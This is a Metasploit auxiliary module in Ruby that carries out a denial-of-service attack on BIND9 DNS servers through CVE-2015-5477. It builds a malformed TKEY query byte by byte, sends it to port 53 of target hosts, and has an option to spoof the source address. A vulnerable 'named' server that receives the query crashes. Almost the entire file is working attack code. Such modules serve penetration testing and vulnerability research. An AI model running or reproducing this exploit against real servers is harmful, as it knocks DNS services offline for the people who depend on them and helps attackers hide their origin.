##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BIND TKEY Query Denial of Service',
      'Description'    => %q{
        This module sends a malformed TKEY query, which exploits an
        error in handling TKEY queries on affected BIND9 'named' DNS servers.
        As a result, a vulnerable named server will exit with a REQUIRE
        assertion failure. This condition can be exploited in versions of BIND
        between BIND 9.1.0 through 9.8.x, 9.9.0 through 9.9.7-P1 and 9.10.0
        through 9.10.2-P2.
      },
      'Author'         => [
        'Jonathan Foote',      # Original discoverer
        'throwawayokejxqbbif', # PoC
        'wvu'                  # Metasploit module
      ],
      'References'     => [
        ['CVE', '2015-5477'],
        ['URL', 'https://www.isc.org/blogs/cve-2015-5477-an-error-in-handling-tkey-queries-can-cause-named-to-exit-with-a-require-assertion-failure/'],
        ['URL', 'https://kb.isc.org/article/AA-01272']
      ],
      'DisclosureDate' => '2015-07-28',
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {'ScannerRecvWindow' => 0}
    ))

    register_options([
      Opt::RPORT(53),
      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])
    ])

    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
  end

  def scan_host(ip)
    if datastore['SRC_ADDR']
      scanner_spoof_send(payload, ip, rport, datastore['SRC_ADDR'])
    else
      print_status("Sending packet to #{ip}")
      scanner_send(payload, ip, rport)
    end
  end

  def payload
    name = Rex::Text.rand_text_alphanumeric(rand(42) + 1)
    txt  = Rex::Text.rand_text_alphanumeric(rand(42) + 1)

    name_length = [name.length].pack('C')
    txt_length  = [txt.length].pack('C')
    data_length = [txt.length + 1].pack('n')
    ttl         = [rand(2 ** 31 - 1) + 1].pack('N')

    query  = "\x00\x00"  # Transaction ID: 0x0000
    query << "\x00\x00"  # Flags: 0x0000 Standard query
    query << "\x00\x01"  # Questions: 1
    query << "\x00\x00"  # Answer RRs: 0
    query << "\x00\x00"  # Authority RRs: 0
    query << "\x00\x01"  # Additional RRs: 1

    query << name_length # [Name Length]
    query << name        # Name
    query << "\x00"      # [End of name]
    query << "\x00\xf9"  # Type: TKEY (Transaction Key) (249)
    query << "\x00\x01"  # Class: IN (0x0001)

    query << name_length # [Name Length]
    query << name        # Name
    query << "\x00"      # [End of name]
    query << "\x00\x10"  # Type: TXT (Text strings) (16)
    query << "\x00\x01"  # Class: IN (0x0001)
    query << ttl         # Time to live
    query << data_length # Data length
    query << txt_length  # TXT Length
    query << txt         # TXT
  end
end
